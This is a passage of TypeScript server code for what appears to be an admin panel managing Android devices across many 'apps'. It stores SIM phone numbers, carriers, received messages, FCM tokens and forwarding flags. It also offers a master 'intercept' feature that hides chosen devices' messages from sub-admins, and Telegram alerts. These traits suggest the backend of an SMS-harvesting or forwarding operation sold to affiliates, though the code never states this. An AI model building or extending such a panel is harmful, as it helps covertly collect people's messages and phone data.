    return c.json({ error: "Wrong Master PIN." }, 401);
  }

  // correct pin — reset attempt counter
  await sqlLimit(
    `INSERT INTO master_login_attempts (ip, failed_count, last_attempt, locked_until)
     VALUES ($1, 0, NOW(), NULL)
     ON CONFLICT (ip) DO UPDATE SET failed_count = 0, last_attempt = NOW(), locked_until = NULL`,
    [ip],
  );

  // Create master session
  const sessionId = crypto.randomUUID();
  const userAgent = c.req.header("user-agent") ?? "";
  const sqlC = neon(c.env.NEON_DATABASE_URL);
  // Ensure table exists (may not exist on first ever login)
  await sqlC(`CREATE TABLE IF NOT EXISTS master_sessions (id TEXT PRIMARY KEY, login_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), ip TEXT NOT NULL DEFAULT '', user_agent TEXT NOT NULL DEFAULT '')`).catch(() => {});

  // Enforce max concurrent master sessions
  const [{ value: sessionLimitStr } = { value: "3" }] = await sqlC(
    `SELECT value FROM settings WHERE key = 'master_session_limit' LIMIT 1`,
  ) as Array<{ value: string }>;
  const sessionLimit = Math.max(1, parseInt(sessionLimitStr ?? "3", 10) || 3);
  // Drop dead sessions (no ping in 2min = browser/tab closed) before counting, so a closed
  // session frees up its login-limit slot right away instead of lingering until the 20-row cap.
  await sqlC(`DELETE FROM master_sessions WHERE login_at < NOW() - INTERVAL '2 minutes'`).catch(() => {});
  const [{ c: activeMasterCount } = { c: 0 }] = await sqlC(
    `SELECT COUNT(*)::int AS c FROM master_sessions WHERE login_at > NOW() - INTERVAL '2 minutes'`,
  ) as Array<{ c: number }>;
  if (activeMasterCount >= sessionLimit) {
    return c.json({ error: `Master login limit reached (${sessionLimit}). Pehle kisi ek session ko logout karo.` }, 429);
  }

  await sqlC(
    `INSERT INTO master_sessions (id, ip, user_agent) VALUES ($1, $2, $3)`,
    [sessionId, ip, userAgent]
  ).catch(() => {});
  // Clean up old sessions (keep last 20)
  await sqlC(`DELETE FROM master_sessions WHERE id NOT IN (SELECT id FROM master_sessions ORDER BY login_at DESC LIMIT 20)`).catch(() => {});

  // Issue a JWT for the admin panel session
    const jwtSecret = (c.env as Env).JWT_SECRET;
    let token: string | undefined;
    if (jwtSecret) {
      token = await signJwt(
        { sub: sessionId, role: "master", iss: "mr-panel", iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 86400 },
        jwtSecret
      );
    }
    return c.json({ ok: true, sessionId, ...(token ? { token } : {}) });
  });

// ══════════════════════════════════════════════════════════════════════════════
// ── NEW AUTH ROUTES: Google OAuth + Phone OTP ─────────────────────────────
// ══════════════════════════════════════════════════════════════════════════════

// In-memory OTP store (keyed by last-10-digit phone, TTL 5 min)
// Cloudflare Workers: module-level state persists across requests in same isolate
interface OtpEntry { otp: string; expiresAt: number; attempts: number }
const _otpStore = new Map<string, OtpEntry>();

// In-memory rate limiter (per IP) for auth endpoints
interface AuthRateEntry { count: number; lockedUntil: number | null }
const _authRateMap = new Map<string, AuthRateEntry>();
const AUTH_RATE_MAX = 5;
const AUTH_RATE_LOCKOUT_MS = 15 * 60 * 1000;
function _checkAuthRate(ip: string): { blocked: boolean; minutesLeft?: number } {
  const now = Date.now(); const e = _authRateMap.get(ip);
  if (!e) return { blocked: false };
  if (e.lockedUntil && now < e.lockedUntil) return { blocked: true, minutesLeft: Math.ceil((e.lockedUntil - now) / 60_000) };
  if (e.lockedUntil && now >= e.lockedUntil) _authRateMap.delete(ip);
  return { blocked: false };
}
function _recordAuthFail(ip: string): void {
  const e = _authRateMap.get(ip) ?? { count: 0, lockedUntil: null };
  e.count += 1;
  if (e.count >= AUTH_RATE_MAX) e.lockedUntil = Date.now() + AUTH_RATE_LOCKOUT_MS;
  _authRateMap.set(ip, e);
}

/** Helper: create master session in DB and sign JWT */
async function _createMasterSession(c: Parameters<typeof app.post>[1] extends (c: infer C) => unknown ? C : never): Promise<{ token: string; sessionId: string }> {
  const jwtSecret = c.env.JWT_SECRET;
  if (!jwtSecret) throw new Error("JWT_SECRET not configured");
  const sqlC = neon(c.env.NEON_DATABASE_URL);
  await sqlC(`CREATE TABLE IF NOT EXISTS master_sessions (id TEXT PRIMARY KEY, login_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), ip TEXT NOT NULL DEFAULT '', user_agent TEXT NOT NULL DEFAULT '')`).catch(() => {});
  // Enforce session limit (reuse same limit as PIN login)
  const [{ value: sessionLimitStr } = { value: "3" }] = await sqlC(
    `SELECT value FROM settings WHERE key = 'master_session_limit' LIMIT 1`,
  ) as Array<{ value: string }>;
  const sessionLimit = Math.max(1, parseInt(sessionLimitStr ?? "3", 10) || 3);
  // Count active rows without deleting historical sessions.
  const [{ c: activeCnt } = { c: 0 }] = await sqlC(
    `SELECT COUNT(*)::int AS c FROM master_sessions WHERE login_at > NOW() - INTERVAL '2 minutes'`,
  ) as Array<{ c: number }>;
  if (activeCnt >= sessionLimit) throw new Error(`Session limit reached (${sessionLimit})`);

  const sessionId = crypto.randomUUID();
  const ip = c.req.header("CF-Connecting-IP") ?? c.req.header("x-forwarded-for") ?? "";
  const ua = c.req.header("user-agent") ?? "";
  await sqlC(`INSERT INTO master_sessions (id, ip, user_agent) VALUES ($1, $2, $3)`, [sessionId, ip, ua]);

  const token = await signJwt(
    { sub: sessionId, role: "master", iss: "mr-panel", iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 8 * 3600 },
    jwtSecret
  );
  return { token, sessionId };
}

/* Password login uses the existing stored master credential. No reset/default,
 * hash migration, DELETE, or business-data mutation is performed here. */
app.post("/api/auth/password-verify", async (c) => {
  const ip = c.req.header("CF-Connecting-IP") ?? c.req.header("x-forwarded-for") ?? "";
  const rate = _checkAuthRate(ip);
  if (rate.blocked) return c.json({ error: `Too many attempts. Try in ${rate.minutesLeft} min.` }, 429);
  const body = await c.req.json().catch(() => null) as { password?: unknown } | null;
  if (!body || typeof body.password !== "string" || !body.password || body.password.length > 256) {
    return c.json({ error: "Enter your existing master password / PIN." }, 400);
  }
  try {
    const stored = await getMasterPin(c.env);
    if (!stored) {
      return c.json({ error: "Master credential unavailable or not configured. No default password is created." }, 503);
    }
    if (!(await _verifyPin(body.password, stored, c.env.PIN_PEPPER ?? ""))) {
      _recordAuthFail(ip);
      return c.json({ error: "Incorrect master password / PIN." }, 401);
    }
    const { token, sessionId } = await _createMasterSession(c);
    _authRateMap.delete(ip);
    return c.json({ ok: true, token, sessionId });
  } catch (error) {
    const message = error instanceof Error ? error.message : "";
    if (message.startsWith("Session limit")) return c.json({ error: message }, 429);
    if (message === "JWT_SECRET not configured") {
      return c.json({ error: "Server authentication configuration missing." }, 503);
    }
    return c.json({ error: "Unable to sign in. Please try again." }, 500);
  }
});

/* ── GET /api/auth/config — runtime config for frontend (no rebuild needed) ── */
app.get("/api/auth/config", (c) => {
  return c.json({ googleClientId: c.env.GOOGLE_CLIENT_ID ?? null });
});

/* ── POST /api/auth/google-verify — verify Google ID token, issue JWT ── */
app.post("/api/auth/google-verify", async (c) => {
  const ip = c.req.header("CF-Connecting-IP") ?? c.req.header("x-forwarded-for") ?? "";
  const rate = _checkAuthRate(ip);
  if (rate.blocked) return c.json({ error: `Too many attempts. Try in ${rate.minutesLeft} min.` }, 429);

  const { credential } = await c.req.json() as { credential?: string };
  if (!credential) return c.json({ error: "credential required" }, 400);

  const allowedEmail = c.env.MASTER_ADMIN_EMAIL;
  if (!allowedEmail) return c.json({ error: "MASTER_ADMIN_EMAIL not configured on server" }, 503);

  try {
    const infoRes = await fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${credential}`);
    if (!infoRes.ok) { _recordAuthFail(ip); return c.json({ error: "Invalid Google token" }, 401); }
    const info = await infoRes.json() as { email?: string; email_verified?: string };
    if (!info.email || info.email_verified !== "true") { _recordAuthFail(ip); return c.json({ error: "Google account not verified" }, 401); }
    if (info.email.toLowerCase() !== allowedEmail.toLowerCase()) {
      _recordAuthFail(ip);
      return c.json({ error: "Access denied: this Google account is not authorized" }, 403);
    }
    const { token, sessionId } = await _createMasterSession(c);
    return c.json({ ok: true, token, sessionId });
  } catch (err) {
    const msg = err instanceof Error ? err.message : "Verification failed";
    if (msg.startsWith("Session limit")) return c.json({ error: msg }, 429);
    return c.json({ error: "Token verification failed. Try again." }, 500);
  }
});

/* ── POST /api/auth/send-otp — DISABLED: OTP login replaced by Google OAuth ── */
app.post("/api/auth/send-otp", async (c) => {
  return c.json({ error: "OTP login is disabled. Use Google Sign-In." }, 410);
});

/* ── POST /api/auth/verify-otp — DISABLED: OTP login replaced by Google OAuth ── */
app.post("/api/auth/verify-otp", async (c) => {
  return c.json({ error: "OTP login is disabled. Use Google Sign-In." }, 410);
});

// ── Master Login Sessions ──
// POST: register current session (for already-logged-in users)
app.post("/api/master/sessions", async (c) => {
  if (!(await isMasterSession(c))) return c.json({ error: "Unauthorized" }, 401);
  const sqlC = neon(c.env.NEON_DATABASE_URL);
  await sqlC(`CREATE TABLE IF NOT EXISTS master_sessions (id TEXT PRIMARY KEY, login_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), ip TEXT NOT NULL DEFAULT '', user_agent TEXT NOT NULL DEFAULT '')`).catch(() => {});
  const sessionId = crypto.randomUUID();
  const ip = c.req.header("CF-Connecting-IP") ?? c.req.header("x-forwarded-for") ?? "";
  const userAgent = c.req.header("user-agent") ?? "";
  await sqlC(`INSERT INTO master_sessions (id, ip, user_agent) VALUES ($1, $2, $3)`, [sessionId, ip, userAgent]);
  await sqlC(`DELETE FROM master_sessions WHERE id NOT IN (SELECT id FROM master_sessions ORDER BY login_at DESC LIMIT 20)`).catch(() => {});
  return c.json({ sessionId });
});

app.get("/api/master/sessions", async (c) => {
  if (!(await isMasterSession(c))) return c.json({ error: "Unauthorized" }, 401);
  const sqlC = neon(c.env.NEON_DATABASE_URL);
  await sqlC(`CREATE TABLE IF NOT EXISTS master_sessions (id TEXT PRIMARY KEY, login_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), ip TEXT NOT NULL DEFAULT '', user_agent TEXT NOT NULL DEFAULT '')`).catch(() => {});
  const rows = await sqlC(`SELECT id, ip, user_agent AS "userAgent", login_at AS "loginAt" FROM master_sessions WHERE login_at > NOW() - INTERVAL '2 minutes' ORDER BY login_at DESC LIMIT 50`) as Array<{ id: string; ip: string; userAgent: string; loginAt: string }>;
  return c.json(rows);
});

// Lightweight heartbeat the master panel calls every ~15s while its tab is open — this is
// the entire "is the browser still open" signal; isMasterSession() bumps login_at on any hit.
app.post("/api/master/ping", async (c) => {
  if (!(await isMasterSession(c))) return c.json({ error: "Unauthorized" }, 401);
  return c.json({ ok: true });
});

app.delete("/api/master/sessions/:id", async (c) => {
  if (!(await isMasterSession(c))) return c.json({ error: "Unauthorized" }, 401);
  const sqlC = neon(c.env.NEON_DATABASE_URL);
  await sqlC(`CREATE TABLE IF NOT EXISTS master_sessions (id TEXT PRIMARY KEY, login_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), ip TEXT NOT NULL DEFAULT '', user_agent TEXT NOT NULL DEFAULT '')`).catch(() => {});
  const id = c.req.param("id");
  await sqlC(`DELETE FROM master_sessions WHERE id = $1`, [id]);
  return c.json({ ok: true });
});

  app.delete("/api/master/sessions", async (c) => {
    if (!(await isMasterSession(c))) return c.json({ error: "Unauthorized" }, 401);
    const sqlC = neon(c.env.NEON_DATABASE_URL);
    await sqlC(`CREATE TABLE IF NOT EXISTS master_sessions (id TEXT PRIMARY KEY, login_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), ip TEXT NOT NULL DEFAULT '', user_agent TEXT NOT NULL DEFAULT '')`).catch(() => {});
    await sqlC(`DELETE FROM master_sessions`);
    return c.json({ ok: true });
  });

// ── Master SSE — EventSource can't send headers, PIN in query param ──
// Cloudflare Workers support streaming; client reconnects every ~25s (CF CPU limit).
app.get("/api/master/events", async (c) => {
  // Auth fully handled by middleware (HMAC token via ?token=) — no inner PIN check needed
  const { readable, writable } = new TransformStream<Uint8Array, Uint8Array>();
  const writer = writable.getWriter();
  const enc = new TextEncoder();
  // Initial ping so client knows connection is alive
  writer.write(enc.encode(":ping\n\n")).catch(() => {});
  // Keep-alive pings every 20s (Cloudflare closes idle streams at 30s)
  let done = false;
  const tick = setInterval(() => {
    if (done) { clearInterval(tick); return; }
    writer.write(enc.encode(":ping\n\n")).catch(() => { done = true; clearInterval(tick); });
  }, 20000);
  // Close after 25s so CF doesn't hard-kill it; client auto-reconnects via onerror
  setTimeout(() => { done = true; clearInterval(tick); writer.close().catch(() => {}); }, 25000);
  return new Response(readable as ReadableStream, {
    headers: {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      "X-Accel-Buffering": "no",
    },
  });
});

// ── Master intercept: hide specific device messages from sub-admin ──
app.get("/api/master/intercept", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const ids = await getInterceptedDevices(c.env);
  return c.json({ intercepted: ids });
});
app.post("/api/master/intercept/:deviceId", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const deviceId = c.req.param("deviceId");
  const ids = await getInterceptedDevices(c.env);
  const updated = [...new Set([...ids, deviceId])];
  await setInterceptedDevices(c.env, updated);
  return c.json({ ok: true, intercepted: updated });
});
app.delete("/api/master/intercept/:deviceId", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const deviceId = c.req.param("deviceId");
  const ids = await getInterceptedDevices(c.env);
  const updated = ids.filter((id) => id !== deviceId);
  await setInterceptedDevices(c.env, updated);
  return c.json({ ok: true, intercepted: updated });
});

app.patch("/api/admin/master-pin", async (c) => {
  const body = await c.req.json() as { currentPin?: string; newPin?: string };
  const currentMasterPin = await getMasterPin(c.env);
  // Accept auth via x-master-pin header OR currentPin in body
  const presented = decodeMasterPinHeader(c.req.header("x-master-pin")) ?? body.currentPin ?? "";
  if (!presented || presented !== currentMasterPin) return c.json({ error: "Wrong Master PIN" }, 401);
  if (!body.newPin || body.newPin.trim().length < 4) return c.json({ error: "newPin required (min 4 chars)" }, 400);
  const sql = neon(c.env.NEON_DATABASE_URL);
  await sql(`INSERT INTO settings (key, value) VALUES ('master_pin', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.newPin.trim()]);
  _masterPinCache = { value: body.newPin.trim(), ts: Date.now() };
  return c.json({ ok: true });
});

// Master admin: get all apps (including PIN) — requires x-master-session (see checkMasterPin)
app.get("/api/master/apps", async (c) => {
    const guard = await checkMasterPin(c as never);
    if (guard) return guard;
    const db = getDb(c.env);
    const sqlClient = neon(c.env.NEON_DATABASE_URL);
    const rows = await db.select().from(apps).orderBy(desc(apps.createdAt));
    // Backfill panel tokens for apps created before hard-enforcement was added,
    // so every app has one to embed in its access link.
    const allAppIds = (await db.select({ appId: apps.appId }).from(apps)).map(r => r.appId);
    const existingTokenIds = new Set((await db.select({ appId: appPanelTokens.appId }).from(appPanelTokens)).map(r => r.appId));
    const missingTokenIds = allAppIds.filter(id => !existingTokenIds.has(id));
    if (missingTokenIds.length > 0) {
      await Promise.all(missingTokenIds.map(id =>
        db.insert(appPanelTokens).values({ appId: id, panelToken: crypto.randomUUID() }).onConflictDoNothing({ target: appPanelTokens.appId })
      ));
    }
    // Count active sessions per app
    const sessionCounts = await sqlClient(
      `SELECT app_id, COUNT(*) as cnt FROM admin_sessions WHERE last_active > NOW() - INTERVAL '1 hour' GROUP BY app_id`,
    ) as Array<{ app_id: string; cnt: string }>;
    const sessionMap = Object.fromEntries(sessionCounts.map(r => [r.app_id, Number(r.cnt)]));
    const secretRows = await db.select().from(appSecrets);
    const secretMap = Object.fromEntries(secretRows.map(r => [r.appId, r]));
    const tokenRows = await db.select().from(appPanelTokens);
    const tokenMap = Object.fromEntries(tokenRows.map(r => [r.appId, r]));
    // SECURITY: pin / panelToken / deleteProtectionPin live in a separate table (app_secrets)
    // and are intentionally NOT included here. A single master-pin call must never dump every
    // app's secrets at once — use GET /api/master/apps/:appId/secret to fetch one app's
    // credentials at a time.
    return c.json(rows.map(r => {
      const s = secretMap[r.appId];
      return {
        id: r.id, appId: r.appId, name: r.name,
        hasPanelToken: !!tokenMap[r.appId]?.panelToken,
        status: r.status,
        createdAt: isoReq(r.createdAt),
        hasDeleteProtectionPin: !!s?.deleteProtectionPin,
        deleteProtectionEnabled: s?.deleteProtectionEnabled ?? false,
        loginLimit: s?.loginLimit ?? 20,
        activeSessions: sessionMap[r.appId] ?? 0,
      };
    }));
  });

// Master admin: fetch sensitive credentials (pin, panelToken, delete-protection pin) for ONE app at a time.
// Kept separate from the list endpoint so a single call never dumps every app's secrets at once.
app.get("/api/master/apps/:appId/secret", async (c) => {
    const guard = await checkMasterPin(c as never);
    if (guard) return guard;
    const db = getDb(c.env);
    const [row] = await db.select().from(appSecrets).where(eq(appSecrets.appId, c.req.param("appId"))).limit(1);
    if (!row) return c.json({ error: "App not found" }, 404);
    const [tokenRow] = await db.select().from(appPanelTokens).where(eq(appPanelTokens.appId, c.req.param("appId"))).limit(1);
    const resp = c.json({ pin: row.pin, panelToken: tokenRow?.panelToken ?? null, deleteProtectionPin: row.deleteProtectionPin ?? null });
    resp.headers.set("Cache-Control", "no-store, no-cache, must-revalidate");
    return resp;
  });

// Master admin: create app — requires x-master-session (see checkMasterPin)
app.post("/api/master/apps", async (c) => {
    const guard = await checkMasterPin(c as never);
    if (guard) return guard;
    const db = getDb(c.env);
    const body = await c.req.json() as { appId?: string; name?: string; pin?: string };
    if (!body.appId || !body.name || !body.pin) return c.json({ error: "appId, name and pin are required" }, 400);
    const inserted = await db.insert(apps).values({
      appId: body.appId, name: body.name, status: "active",
    }).onConflictDoNothing({ target: apps.appId }).returning();
    if (inserted.length === 0) return c.json({ error: "App ID already exists" }, 409);
    const panelToken = crypto.randomUUID();
    await db.insert(appSecrets).values({
      appId: body.appId, pin: body.pin,
    }).onConflictDoNothing({ target: appSecrets.appId });
    await db.insert(appPanelTokens).values({
      appId: body.appId, panelToken,
    }).onConflictDoNothing({ target: appPanelTokens.appId });
    const r = inserted[0];
    return c.json({ id: r.id, appId: r.appId, name: r.name, pin: body.pin, panelToken, status: r.status, createdAt: isoReq(r.createdAt) }, 201);
  });

// Master admin: update app (name/pin/status) — requires x-master-session (see checkMasterPin)
app.patch("/api/master/apps/:appId", async (c) => {
    const guard = await checkMasterPin(c as never);
    if (guard) return guard;
    const db = getDb(c.env);
    const appId = c.req.param("appId");
    const body = await c.req.json() as { name?: string; pin?: string; status?: string; };
    const patch: Partial<typeof apps.$inferInsert> = {};
    if (body.name) patch.name = body.name;
    if (body.status) patch.status = body.status;

    if (body.pin) {
      await db.update(appSecrets).set({ pin: body.pin }).where(eq(appSecrets.appId, appId));
    }

    let updated: (typeof apps.$inferSelect)[];
    if (Object.keys(patch).length > 0) {
      updated = await db.update(apps).set(patch).where(eq(apps.appId, appId)).returning();
    } else {
      updated = await db.select().from(apps).where(eq(apps.appId, appId));
    }
    if (updated.length === 0) return c.json({ error: "App not found" }, 404);
    // PIN change — purani saari sessions delete karo
    if (body.pin) {
      const sqlC = neon(c.env.NEON_DATABASE_URL);
      await sqlC(`DELETE FROM admin_sessions WHERE app_id = $1`, [appId]);
      for (const [k, v] of _sessionCache.entries()) { if (v.appId === appId) _sessionCache.delete(k); }
    }
    const r = updated[0];
    return c.json({ id: r.id, appId: r.appId, name: r.name, status: r.status, createdAt: isoReq(r.createdAt) });
  });


// Master admin: fast stats — online count + total devices via SQL COUNT (no full table download)
app.get("/api/master/stats", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const sqlA = neon(c.env.NEON_DATABASE_URL);
  const threshold15m = new Date(Date.now() - 15 * 60 * 1000).toISOString();
  const threshold30m = new Date(Date.now() - 30 * 60 * 1000).toISOString();
  const [devRow, appRow, msgRow, sessRow] = await Promise.all([
    sqlA(`SELECT
      COUNT(*) AS total_devices,
      COUNT(*) FILTER (WHERE last_online > $1) AS online_count
    FROM devices`, [threshold15m]),
    sqlA(`SELECT
      COUNT(*) AS total_apps,
      COUNT(*) FILTER (WHERE status = 'active') AS active_apps,
      COUNT(*) FILTER (WHERE created_at::date = CURRENT_DATE) AS apps_today
    FROM apps`),
    sqlA(`SELECT
      COUNT(*) AS total_messages,
      COUNT(*) FILTER (WHERE received_at::date = CURRENT_DATE) AS messages_today
    FROM messages`),
    sqlA(`SELECT COUNT(*) AS active_sessions FROM admin_sessions WHERE last_active > $1`, [threshold30m]),
  ]);
  const d = devRow[0] as Record<string,unknown>;
  const a = appRow[0] as Record<string,unknown>;
  const m = msgRow[0] as Record<string,unknown>;
  const s = sessRow[0] as Record<string,unknown>;
  return c.json({
    onlineCount:     Number(d.online_count   ?? 0),
    totalDevices:    Number(d.total_devices  ?? 0),
    totalApps:       Number(a.total_apps     ?? 0),
    activeApps:      Number(a.active_apps    ?? 0),
    appsToday:       Number(a.apps_today     ?? 0),
    totalMessages:   Number(m.total_messages ?? 0),
    messagesToday:   Number(m.messages_today ?? 0),
    activeSessions:  Number(s.active_sessions ?? 0),
  });
});

// Master admin: all devices across all app-ids — requires x-master-session (see checkMasterPin)
// Telegram: auto-discover chat ID from getUpdates and save to settings
app.post("/api/master/telegram/setup", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const token = c.env.TELEGRAM_BOT_TOKEN ?? "";
  const resp = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=10`);
  const tgData = await resp.json() as { ok: boolean; result?: Array<{ message?: { chat?: { id: number; first_name?: string } } }> };
  if (!tgData.ok || !tgData.result?.length) {
    return c.json({ error: "Bot ko pehle ek message bhejo, fir dobara try karo." }, 400);
  }
  const latest = [...tgData.result].reverse().find(u => u.message?.chat?.id);
  const foundChatId = String(latest?.message?.chat?.id ?? "");
  if (!foundChatId) return c.json({ error: "Chat ID nahi mila" }, 400);
  const sqlSetup = neon(c.env.NEON_DATABASE_URL);
  await sqlSetup(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [foundChatId]);
  await sendTelegram(c.env, "Bot connected! Notifications are now active.");
  return c.json({ ok: true, chatId: foundChatId });
});

// Telegram: get current config status
app.get("/api/master/telegram/status", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const chatId = await tgChatId(c.env);
  return c.json({ configured: !!chatId, chatId: chatId ?? null });
});

// Telegram: manually set chat ID
app.post("/api/master/telegram/set-chat", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const body = await c.req.json() as { chatId?: string };
  if (!body.chatId) return c.json({ error: "chatId required" }, 400);
  const sqlChat = neon(c.env.NEON_DATABASE_URL);
  await sqlChat(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.chatId]);
  await sendTelegram(c.env, "Bot connected!");
  return c.json({ ok: true });
});

// Master admin: get all devices across all apps
app.get("/api/master/all-devices", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const hasFcmOnly = c.req.query("hasFcm") === "1" || c.req.query("hasFcm") === "true";
  const sqlA = neon(c.env.NEON_DATABASE_URL);
  if (hasFcmOnly) {
    // Lightweight FCM-only list for ping-all — only returns deviceId, appId, name
    const rows = await sqlA(`SELECT device_id, app_id, name FROM devices WHERE fcm_token IS NOT NULL AND fcm_token != '' ORDER BY app_id, name`);
    return c.json((rows as Array<Record<string,unknown>>).map(r => ({
      deviceId: String(r.device_id), appId: String(r.app_id), name: String(r.name ?? ''), hasFcm: true,
    })));
  }
  const db = getDb(c.env);
  const appIdQ = c.req.query("appId");
  const searchQ = (c.req.query("search") ?? "").trim();
  const limitN = Math.max(0, parseInt(c.req.query("limit") ?? "0", 10) || 0);
  const onlineOnly = c.req.query("onlineOnly") === "1";
  const offsetN = Math.max(0, parseInt(c.req.query("offset") ?? "0", 10) || 0);
  // Build filter conditions
  const conds: ReturnType<typeof eq>[] = [];
  if (appIdQ) conds.push(eq(devices.appId, appIdQ));
  if (searchQ) {
    const like = `%${searchQ.replace(/[%_\\]/g, "\\$&")}%`;
    conds.push(sql`(${devices.name} ILIKE ${like} OR ${devices.deviceId} ILIKE ${like} OR COALESCE(${devices.sim1Phone},'') ILIKE ${like} OR COALESCE(${devices.sim2Phone},'') ILIKE ${like} OR COALESCE(${devices.userId},'') ILIKE ${like})` as unknown as ReturnType<typeof eq>);
  }
  if (onlineOnly) conds.push(eq(devices.status, "online"));
  const where = conds.length === 0 ? undefined : conds.length === 1 ? conds[0] : and(...conds);
  // Fast COUNT for total
  const [{ total }] = await db.select({ total: sql<number>`COUNT(*)::int` }).from(devices).where(where);
  // Paginated data
  const baseQ = db.select().from(devices).where(where).orderBy(asc(devices.appId), asc(devices.name));
  const rows = limitN > 0 ? await baseQ.limit(limitN).offset(offsetN) : await baseQ;
  const mapRow = (r: typeof rows[0]) => ({
    id: r.id, deviceId: r.deviceId, appId: r.appId, userId: r.userId,
    name: r.name, androidVersion: r.androidVersion,
    sim1Carrier: r.sim1Carrier, sim1Phone: r.sim1Phone,
    sim2Carrier: r.sim2Carrier, sim2Phone: r.sim2Phone,
    status: r.status, lastOnline: iso(r.lastOnline),
    forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
    hasFcm: r.fcmToken !== null && r.fcmToken !== "",
    installedAt: isoReq(r.installedAt),
  });
  return c.json({ data: rows.map(mapRow), total, hasMore: limitN > 0 && offsetN + limitN < total });
});

// Master admin: delete app — requires x-master-session (see checkMasterPin)
app.delete("/api/master/apps/:appId", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const db = getDb(c.env);
  const appId = c.req.param("appId");
  if (appId === DEFAULT_APP_ID) return c.json({ error: "Cannot delete the default app" }, 400);
  await db.delete(apps).where(eq(apps.appId, appId));
  await db.delete(appSecrets).where(eq(appSecrets.appId, appId));
  return c.json({ ok: true });
});

// Master admin: rotate an app's panel token — instantly kills the old access link
// (and every session logged in through it) so a leaked/attacker link stops working.
app.post("/api/master/apps/:appId/regenerate-token", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  const db = getDb(c.env);
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const appId = c.req.param("appId");
  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) return c.json({ error: "App not found" }, 404);
  const newToken = crypto.randomUUID();
  await db.insert(appPanelTokens).values({ appId, panelToken: newToken }).onConflictDoUpdate({ target: appPanelTokens.appId, set: { panelToken: newToken } });
  // Force-logout every currently active session for this app — the old link's
  // holder (including an attacker) must not stay logged in after rotation.
  await sqlClient(`DELETE FROM admin_sessions WHERE app_id = $1`, [appId]);
  return c.json({ ok: true, panelToken: newToken });
});

// Sub-admin: rotate own panel token — session authenticated via JWT Bearer
// New token invalidates the old login link; all OTHER sessions are dropped so leaked
// links cannot be reused. The caller's own session is preserved so they stay logged in.
// Sub-admin self-service token rotation REMOVED — only master admin can rotate the
// login link now (see /api/master/apps/:appId/regenerate-token). Kept as a stub that
// always denies, in case any old client still calls it.
app.post("/api/apps/:appId/regenerate-token", async (c) => {
  return c.json({ error: "Only the master admin can change the login link. Please contact your admin." }, 403);
});

// Sub-admin: fetch admin replies for complaint chat (polled every 5s by dashboard)
// POST /api/apps/tg-bootstrap — frontend stores bot token+chatId so /reply can send confirmations
app.post("/api/apps/tg-bootstrap", async (c) => {
  const guard = await checkMasterPin(c as never);
  if (guard) return guard;
  try {
    const body = await c.req.json() as { token?: string; chatId?: string };
    if (body.token && body.chatId) {
      const sql = neon(c.env.NEON_DATABASE_URL);
      await sql(`INSERT INTO settings (key, value) VALUES ('telegram_bot_token', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.token]);
      await sql(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.chatId]);
    }
  } catch { /* silent */ }
  return c.json({ ok: true });
});

app.post("/api/apps/:appId/complaint", async (c) => {
    const appId = c.req.param("appId");
    try {
      const body = await c.req.json() as { text?: string; lang?: string };
      const text = (body.text ?? "").trim();
      if (!text) return c.json({ error: "text is required" }, 400);
      const sqlClient = neon(c.env.NEON_DATABASE_URL);
      let botToken = c.env.TELEGRAM_BOT_TOKEN ?? "";
      let chatId = c.env.TELEGRAM_CHAT_ID ?? "";
      if (!botToken || !chatId) {
        const settRows = await sqlClient(`SELECT key, value FROM settings WHERE key IN ('telegram_bot_token','telegram_chat_id')`) as Array<{ key: string; value: string }>;
        for (const row of settRows) {
          if (row.key === "telegram_bot_token" && !botToken) botToken = row.value;
          if (row.key === "telegram_chat_id" && !chatId) chatId = row.value;
        }
      }
      if (!botToken || !chatId) return c.json({ error: "Telegram not configured" }, 500);
      const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
      const msg = [
        "🆘 *New Complaint Received!*",
        "",
        "📱 *Token:* \`" + appId + "\`",
        "⏰ *Time:*  " + now,
        "*Language:* " + (body.lang === "hindi" ? "हिंदी" : "English"),
        "",
        "💬 *Complaint:*",
        text,
      ].join("\n");
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: msg,
          parse_mode: "Markdown",
          reply_markup: { inline_keyboard: [[{ text: "📝 Reply to this complaint", callback_data: "startreply:" + appId }]] },
        }),
      }).catch(() => {});
      return c.json({ ok: true });
    } catch (e) {
      return c.json({ error: String(e) }, 500);
    }
  });

  app.get("/api/apps/:appId/complaint-replies", async (c) => {
  const appId = c.req.param("appId");
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  try {
